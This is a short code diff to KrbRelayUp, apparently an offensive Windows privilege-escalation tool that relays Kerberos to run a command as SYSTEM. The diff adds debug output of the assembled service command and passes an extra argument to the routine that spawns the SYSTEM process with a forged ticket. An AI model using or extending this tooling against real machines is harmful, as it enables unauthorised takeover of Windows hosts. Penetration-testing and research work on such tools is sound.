@@ -234,11 +234,13 @@ namespace KrbRelayUp
 
             ParseArgs(args);
 
+            Console.WriteLine($"[+] Command Line {Options.serviceCommand}");
+
             if (Options.phase == Options.PhaseType.System)
             {
                 try
                 {
-                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
+                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]), args[2]);
                 }
                 catch { }
                 return;
@@ -394,6 +396,9 @@ namespace KrbRelayUp
                         finalCommand = $"{finalCommand} --ServiceName \"{Options.serviceName}\"";
                     if (!String.IsNullOrEmpty(Options.serviceCommand))
                         finalCommand = $"{finalCommand} --ServiceCommand \"{Options.serviceCommand}\"";
+
+                    Console.WriteLine($"[+] final command: {finalCommand}");
+
                     Helpers.CreateProcessNetOnly(finalCommand, show: false, kirbiBytes: bFinalTicket);
                 }
                 else
